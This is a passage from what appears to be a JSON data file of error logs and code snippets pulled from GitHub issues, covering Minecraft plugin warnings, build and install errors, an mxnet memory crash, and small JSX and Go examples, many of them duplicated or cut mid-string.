taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: taiga_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_spruce_taiga\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_spruce_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_tree_taiga\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_tree_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: jungle_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: jungle_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: bamboo_jungle_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_jungle_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: wooded_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: dark_forest_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: swamp_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: desert_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: desert_lakes\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: deep_warm_ocean\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: birch_forest_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: tall_birch_forest\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountain_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: stone_shore\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_tundra\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_mountains\r\n[Truncated]\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: tall_birch_forest\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountain_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: stone_shore\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_tundra\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: wooded_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: taiga_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_spruce_taiga\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_spruce_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_tree_taiga\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_tree_taiga_hills\r\n"
    },
    {
        "logs": "```\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: jungle_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: jungle_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: bamboo_jungle_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_jungle_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: wooded_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: dark_forest_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: swamp_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: desert_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: desert_lakes\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: deep_warm_ocean\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: birch_forest_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: tall_birch_forest\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountain_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: stone_shore\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_tundra\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: wooded_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: taiga_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_spruce_taiga\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_spruce_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_tree_taiga\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_tree_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: jungle_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: jungle_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: bamboo_jungle_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_jungle_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: wooded_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: dark_forest_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: swamp_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: desert_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: desert_lakes\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: deep_warm_ocean\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: birch_forest_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: tall_birch_forest\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountain_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: stone_shore\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_tundra\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: wooded_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: taiga_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_spruce_taiga\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_spruce_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_tree_taiga\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_tree_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: jungle_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: jungle_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: bamboo_jungle_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_jungle_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: wooded_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: dark_forest_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: swamp_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: desert_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: desert_lakes\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: deep_warm_ocean\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: birch_forest_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: tall_birch_forest\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountain_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: stone_shore\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_tundra\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_mountains\r\n[Truncated]\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: tall_birch_forest\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: mountain_edge\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: modified_gravelly_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: stone_shore\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_tundra\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: snowy_taiga_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: wooded_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: taiga_mountains\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_spruce_taiga\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_spruce_taiga_hills\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_tree_taiga\r\n[23:44:00] [Server thread/WARN]: [Magic]  Invalid biome in biome_actions config: giant_tree_taiga_hills\r\n"
    },
    {
        "logs": "`\r\n3 | type t = { foo: int } [@@deriving sexp]\r\n                    ^^^\r\nError: This variant pattern is expected to have type none_type\r\n       The constructor Some does not belong to type none_type\r\nHad errors, waiting for filesystem changes...\r\n"
    },
    {
        "logs": "```\r\n3 | type t = { foo: int } [@@deriving sexp]\r\n                    ^^^\r\nError: This variant pattern is expected to have type none_type\r\n       The constructor Some does not belong to type none_type\r\nHad errors, waiting for filesystem changes...\r\n"
    },
    {
        "logs": "```\r\ntiktok-scraper trend -n 6 --filepath /download/tiktok_download/ -t json\r\ninternal/modules/cjs/loader.js:1131\r\n  return process.dlopen(module, path.toNamespacedPath(filename));\r\n                 ^\r\n\r\nError: /lib64/libc.so.6: version `GLIBC_2.18' not found (required by /usr/local/lib/nodejs/lib/node_modules/tiktok-scraper/node_modules/canvas/build/Release/librsvg-2.so.2)\r\n    at Object.Module._extensions..node (internal/modules/cjs/loader.js:1131:18)\r\n    at Module.load (internal/modules/cjs/loader.js:937:32)\r\n    at Function.Module._load (internal/modules/cjs/loader.js:778:12)\r\n    at Module.require (internal/modules/cjs/loader.js:961:19)\r\n    at require (internal/modules/cjs/helpers.js:92:18)\r\n    at Object.<anonymous> (/usr/local/lib/nodejs/lib/node_modules/tiktok-scraper/node_modules/canvas/lib/bindings.js:3:18)\r\n    at Module._compile (internal/modules/cjs/loader.js:1072:14)\r\n    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1101:10)\r\n    at Module.load (internal/modules/cjs/loader.js:937:32)\r\n    at Function.Module._load (internal/modules/cjs/loader.js:778:12)\r\n    at Module.require (internal/modules/cjs/loader.js:961:19)\r\n    at require (internal/modules/cjs/helpers.js:92:18)\r\n    at Object.<anonymous> (/usr/local/lib/nodejs/lib/node_modules/tiktok-scraper/node_modules/canvas/lib/canvas.js:9:18)\r\n    at Module._compile (internal/modules/cjs/loader.js:1072:14)\r\n    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1101:10)\r\n    at Module.load (internal/modules/cjs/loader.js:937:32)\r\n    at Function.Module._load (internal/modules/cjs/loader.js:778:12)\r\n    at Module.require (internal/modules/cjs/loader.js:961:19)\r\n    at require (internal/modules/cjs/helpers.js:92:18)\r\n    at Object.<anonymous> (/usr/local/lib/nodejs/lib/node_modules/tiktok-scraper/node_modules/canvas/index.js:1:16)\r\n    at Module._compile (internal/modules/cjs/loader.js:1072:14)\r\n    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1101:10)\r\n\r\n"
    },
    {
        "logs": "`xz_dep' called for #<DependencyCollector:0x00000001830c38>\nusername_0: ### Bug reports:\r\n\r\nfails to upgrade linux-util\r\n\r\n'brew outdated'\r\n"
    },
    {
        "logs": "`\r\n$ docker --version\r\nDocker version 1.13.0-rc2, build 1f9b3ef\r\n\r\n$ stack --docker image container\r\nRunning /usr/local/bin/docker inspect fpco/stack-build:lts-7.4 exited with ExitFailure 1\r\n\r\n[]\r\n\r\nError: No such object: fpco/stack-build:lts-7.4\r\n"
    },
    {
        "logs": "```\r\n$ docker --version\r\nDocker version 1.13.0-rc2, build 1f9b3ef\r\n\r\n$ stack --docker image container\r\nRunning /usr/local/bin/docker inspect fpco/stack-build:lts-7.4 exited with ExitFailure 1\r\n\r\n[]\r\n\r\nError: No such object: fpco/stack-build:lts-7.4\r\n"
    },
    {
        "logs": "`  \u25cf Test suite failed to run\r\n\r\n    Cannot find module 'ReactElementType' from 'ReactRef.js'\r\n\r\n      at Resolver.resolveModule (node_modules/jest-resolve/build/index.js:151:17)\r\n      at Object.<anonymous> (node_modules/react-native/Libraries/Renderer/src/renderers/shared/stack/reconciler/ReactRef.js:14:344)\r\n      at Object.<anonymous> (node_modules/react-native/Libraries/Renderer/src/renderers/shared/stack/reconciler/ReactReconciler.js:14:14)"
    },
    {
        "logs": "`\r\nuser@lenovo:/usr/share/elasticsearch$ sudo bin/plugin install file:/home/user/software/elasticsearch-carrot2/target/releases/elasticsearch-carrot2-2.4.3.zip --verbose\r\n-> Installing from file:/home/user/software/elasticsearch-carrot2/target/releases/elasticsearch-carrot2-2.4.3.zip...\r\nTrying file:/home/user/software/elasticsearch-carrot2/target/releases/elasticsearch-carrot2-2.4.3.zip ...\r\nDownloading ..................................................DONE\r\nVerifying file:/home/user/software/elasticsearch-carrot2/target/releases/elasticsearch-carrot2-2.4.3.zip checksums if available ...\r\nNOTE: Unable to verify checksum for downloaded plugin (unable to find .sha1 or .md5 file to verify)\r\n- Plugin information:\r\nName: elasticsearch-carrot2\r\nDescription: Search results clustering plugin for ElasticSearch\r\nSite: true\r\nVersion: 2.4.3\r\nJVM: true\r\n * Classname: org.carrot2.elasticsearch.ClusteringPlugin\r\n * Isolated: true\r\nERROR: Plugin [carrot2] is a site plugin but has no '_site/' directory\r\n"
    },
    {
        "logs": "`python': malloc(): memory corruption:\nusername_0: (tvm36) [liqiang@inspur ssd]$ python train_ssd.py \r\n[11:00:12] src/operator/nn/mkldnn/mkldnn_base.cc:74: Allocate 147456 bytes with malloc directly\r\n[11:00:12] src/operator/nn/mkldnn/mkldnn_base.cc:74: Allocate 589824 bytes with malloc directly\r\n[11:00:12] src/operator/nn/mkldnn/mkldnn_base.cc:74: Allocate 2359296 bytes with malloc directly\r\n[11:00:12] src/operator/nn/mkldnn/mkldnn_base.cc:74: Allocate 9437184 bytes with malloc directly\r\nINFO:root:Namespace(batch_size=16, data_shape=512, dataset='voc', epochs=240, gpus='1,2', log_interval=100, lr=0.001, lr_decay=0.1, lr_decay_epoch='160,200', momentum=0.9, network='resnet50_v1', num_workers=4, resume='', save_interval=10, save_prefix='ssd_512_resnet50_v1_voc', seed=233, start_epoch=0, syncbn=False, val_interval=1, wd=0.0005)\r\nINFO:root:Start training from [Epoch 0]\r\npython: malloc.c:2365: sysmalloc: Assertion "
    },
    {
        "logs": "`python': malloc(): memory corruption: 0x00007ff4a0747320 ***\r\n\r\n\r\nwhat is this? anybody help?\n<issue_comment>username_1: Are you using an intel cpu with the mxnet intel library? Because I used to get the same error and the only solution was to switch to the normal version.\n<issue_comment>username_2: If you are using mxnet-mkl version and get this error, try upgrade or use mxnet without mkl\n<issue_comment>username_0: @username_1 @username_2  after change it  into mxnet-cu90, It works fine. \r\nThank you!\n<issue_comment>username_3: @username_4, please take a look for this issue.\r\n\r\n@username_0 thanks to reporting the problem, we will fix it :)\n<issue_comment>username_4: @username_0 cannot reproduce this bug by using "
    },
    {
        "logs": "` to false by default.\n<issue_comment>username_1: @username_4 when it occurred to me, I was using mxnet-mkl (no, gpu ...nvidia driver support on kubuntu is really bad). And I was also finetuning the SSD nn, with more than 2 epochs. I remember it was strange, because, for example, with "
    },
    {
        "logs": "`\r\nwallet/rpcwallet.cpp: In function \u2018UniValue listunspent(const JSONRPCRequest&)\u2019:\r\nwallet/rpcwallet.cpp:2816:9: warning: variable \u2018nMinDepth\u2019 set but not used [-Wunused-but-set-variable]\r\n     int nMinDepth = 1;\r\n         ^~~~~~~~~\r\n"
    },
    {
        "logs": "```\r\nwallet/rpcwallet.cpp: In function \u2018UniValue listunspent(const JSONRPCRequest&)\u2019:\r\nwallet/rpcwallet.cpp:2816:9: warning: variable \u2018nMinDepth\u2019 set but not used [-Wunused-but-set-variable]\r\n     int nMinDepth = 1;\r\n         ^~~~~~~~~\r\n"
    },
    {
        "logs": "`\r\n# github.com/jdeng/goheif/libde265\r\nIn file included from libde265-all.inl:37:0,\r\n                 from libde265.cc:2:\r\n../../go/pkg/mod/github.com/jdeng/goheif@v0.0.0-20200323230657-a0d6a8b3e68f/libde265/libde265/slice.cc:2447:0: warning: \"MAX_PREFIX\" redefined\r\n #define MAX_PREFIX 64\r\n\r\nIn file included from libde265-all.inl:13:0,\r\n                 from libde265.cc:2:\r\n../../go/pkg/mod/github.com/jdeng/goheif@v0.0.0-20200323230657-a0d6a8b3e68f/libde265/libde265/cabac.cc:419:0: note: this is the location of the previous definition\r\n #define MAX_PREFIX 32\r\n\r\ncc1plus: warning: unrecognized command line option \u2018-Wno-constant-conversion\u2019\r\n"
    },
    {
        "logs": "```\r\n# github.com/jdeng/goheif/libde265\r\nIn file included from libde265-all.inl:37:0,\r\n                 from libde265.cc:2:\r\n../../go/pkg/mod/github.com/jdeng/goheif@v0.0.0-20200323230657-a0d6a8b3e68f/libde265/libde265/slice.cc:2447:0: warning: \"MAX_PREFIX\" redefined\r\n #define MAX_PREFIX 64\r\n\r\nIn file included from libde265-all.inl:13:0,\r\n                 from libde265.cc:2:\r\n../../go/pkg/mod/github.com/jdeng/goheif@v0.0.0-20200323230657-a0d6a8b3e68f/libde265/libde265/cabac.cc:419:0: note: this is the location of the previous definition\r\n #define MAX_PREFIX 32\r\n\r\ncc1plus: warning: unrecognized command line option \u2018-Wno-constant-conversion\u2019\r\n"
    },
    {
        "logs": "`node_modules\\react-native-headphone-detection\\android\\src\\main\\java\\com\\tintef\\RNHeadphoneDetection\\RNHeadphoneDetectionModule.java:110: error:\r\n cannot find symbol\r\n          device.getType() == AudioDeviceInfo.TYPE_USB_HEADSET\r\n                                             ^\r\n  symbol:   variable TYPE_USB_HEADSET\r\n  location: class AudioDeviceInfo"
    },
    {
        "logs": "`\r\nWARNING: channel \"pecl.php.net\" has updated its protocols, use \"pecl channel-update pecl.php.net\" to update\r\ndownloading Mosquitto-0.4.0.tgz ...\r\nStarting to download Mosquitto-0.4.0.tgz (23,804 bytes)\r\n........done: 23,804 bytes\r\n\r\nFatal error: Cannot use result of built-in function in write context in C:\\xampp\\php\\pear\\Archive\\Tar.php on line 639\r\n"
    },
    {
        "logs": "```\r\nWARNING: channel \"pecl.php.net\" has updated its protocols, use \"pecl channel-update pecl.php.net\" to update\r\ndownloading Mosquitto-0.4.0.tgz ...\r\nStarting to download Mosquitto-0.4.0.tgz (23,804 bytes)\r\n........done: 23,804 bytes\r\n\r\nFatal error: Cannot use result of built-in function in write context in C:\\xampp\\php\\pear\\Archive\\Tar.php on line 639\r\n"
    },
    {
        "logs": "`\r\nLast error returned.\r\nUnhandled exception caught: LibHac.HorizonResultException: ResultFsNonRealDataVerificationFailed (2002-4604): Hash error!\r\n"
    },
    {
        "logs": "`\r\nLast error returned.\r\nUnhandled exception caught: LibHac.HorizonResultException: ResultFsNonRealDataVerificationFailed (2002-4604): Hash error!\r\n"
    },
    {
        "logs": "```\r\nLast error returned.\r\nUnhandled exception caught: LibHac.HorizonResultException: ResultFsNonRealDataVerificationFailed (2002-4604): Hash error!\r\n"
    },
    {
        "logs": "```\r\nLast error returned.\r\nUnhandled exception caught: LibHac.HorizonResultException: ResultFsNonRealDataVerificationFailed (2002-4604): Hash error!\r\n"
    },
    {
        "logs": "`\r\ninfo: Duende.IdentityServer.Events.DefaultEventService[0]\r\n      {\r\n        \"ClientId\": \"wasm.Client\",\r\n        \"Endpoint\": \"Authorize\",\r\n        \"Scopes\": \"\",\r\n        \"Error\": \"unauthorized_client\",\r\n        \"ErrorDescription\": \"Unknown client or client not enabled\",\r\n        \"Category\": \"Token\",\r\n        \"Name\": \"Token Issued Failure\",\r\n        \"EventType\": \"Failure\",\r\n        \"Id\": 2001,\r\n        \"ActivityId\": \"0HMBT678IK5QL:00000003\",\r\n        \"TimeStamp\": \"2021-09-21T18:58:37Z\",\r\n        \"ProcessId\": 22268,\r\n        \"LocalIpAddress\": \"::1:5001\",\r\n        \"RemoteIpAddress\": \"::1\"\r\n      }\r\n"
    },
    {
        "logs": "`jsx\r\n_handleChange(value) {\r\n  // do something\r\n  this.props.fields.email.onChange(value);\r\n}\r\n\r\n<input {...Object.assign(this.props.fields.email, {\r\n  onChange: this._handleChange }\r\n)} />\r\n"
    },
    {
        "logs": "```jsx\r\n_handleChange(value) {\r\n  // do something\r\n  this.props.fields.email.onChange(value);\r\n}\r\n\r\n<input {...Object.assign(this.props.fields.email, {\r\n  onChange: this._handleChange }\r\n)} />\r\n"
    },
    {
        "logs": "`\n<issue_comment>username_2: I encountered this problem today in RStudio 1.3.1056 on Windows 10. I had my spreadsheet open in Excel, and when I tried to read it in using "
    },
    {
        "logs": "` still crashed a fresh R session not in a project. I then found this post, and closing the spreadsheet in Excel solved the problem. My session info is below:\r\n\r\n"
    },
    {
        "logs": "```\n<issue_comment>username_2: I encountered this problem today in RStudio 1.3.1056 on Windows 10. I had my spreadsheet open in Excel, and when I tried to read it in using `read_csv()`, the R session was aborted. At first I suspected git, but `read_csv()` still crashed a fresh R session not in a project. I then found this post, and closing the spreadsheet in Excel solved the problem. My session info is below:\r\n\r\n"
    },
    {
        "logs": "`go\r\npackage main\r\n\r\nimport (\r\n\t\"net/http\"\r\n\t\"time\"\r\n\r\n\t\"github.com/gorilla/mux\"\r\n\t\"github.com/pkg/errors\"\r\n\t\"go.uber.org/zap\"\r\n)\r\n\r\nfunc main() {\r\n\r\n\tr := mux.NewRouter()\r\n\r\n\tlogger, _ := zap.NewDevelopment()\r\n\tr.Use(func(next http.Handler) http.Handler {\r\n\t\treturn http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\r\n\t\t\tlogger.Debug(\"Running in middleware\")\r\n\t\t})\r\n\t})\r\n\r\n\tv0 := r.PathPrefix(\"/v0\").Subrouter()\r\n\tv0apis := v0.PathPrefix(\"/apis\").Subrouter()\r\n\r\n\tv0.HandleFunc(\"/apis\", func(w http.ResponseWriter, r *http.Request) {\r\n\t\tw.Write([]byte(\"[\\\"/v0/apis/test\\\"]\"))\r\n\t}).Methods(\"GET\")\r\n\r\n\tv0Test := v0apis.PathPrefix(\"/test\").Subrouter()\r\n\tv0Test.Methods(\"GET\").HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\r\n\t\tw.Write([]byte(\"v0 test api\"))\r\n\t})\r\n\r\n\t// Start the actual HTTP server\r\n\ts := &http.Server{\r\n\t\tAddr:           \"localhost:8080\",\r\n\t\tHandler:        r,\r\n\t\tReadTimeout:    24 * time.Hour,\r\n\t\tWriteTimeout:   24 * time.Hour,\r\n\t\tMaxHeaderBytes: 1 << 20,\r\n\t}\r\n\r\n\tlogger.Debug(\"ready?\")\r\n\terr := s.ListenAndServe()\r\n\tif err != nil {\r\n\t\tpanic(errors.Wrap(err, \"error with HTTP server\"))\r\n\t}\r\n\r\n}\r\n"
    },
    {
        "logs": "```go\r\npackage main\r\n\r\nimport (\r\n\t\"net/http\"\r\n\t\"time\"\r\n\r\n\t\"github.com/gorilla/mux\"\r\n\t\"github.com/pkg/errors\"\r\n\t\"go.uber.org/zap\"\r\n)\r\n\r\nfunc main() {\r\n\r\n\tr := mux.NewRouter()\r\n\r\n\tlogger, _ := zap.NewDevelopment()\r\n\tr.Use(func(next http.Handler) http.Handler {\r\n\t\treturn http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\r\n\t\t\tlogger.Debug(\"Running in middleware\")\r\n\t\t})\r\n\t})\r\n\r\n\tv0 := r.PathPrefix(\"/v0\").Subrouter()\r\n\tv0apis := v0.PathPrefix(\"/apis\").Subrouter()\r\n\r\n\tv0.HandleFunc(\"/apis\", func(w http.ResponseWriter, r *http.Request) {\r\n\t\tw.Write([]byte(\"[\\\"/v0/apis/test\\\"]\"))\r\n\t}).Methods(\"GET\")\r\n\r\n\tv0Test := v0apis.PathPrefix(\"/test\").Subrouter()\r\n\tv0Test.Methods(\"GET\").HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\r\n\t\tw.Write([]byte(\"v0 test api\"))\r\n\t})\r\n\r\n\t// Start the actual HTTP server\r\n\ts := &http.Server{\r\n\t\tAddr:           \"localhost:8080\",\r\n\t\tHandler:        r,\r\n\t\tReadTimeout:    24 * time.Hour,\r\n\t\tWriteTimeout:   24 * time.Hour,\r\n\t\tMaxHeaderBytes: 1 << 20,\r\n\t}\r\n\r\n\tlogger.Debug(\"ready?\")\r\n\terr := s.ListenAndServe()\r\n\tif err != nil {\r\n\t\tpanic(errors.Wrap(err, \"error with HTTP server\"))\r\n\t}\r\n\r\n}\r\n"
    },
    {
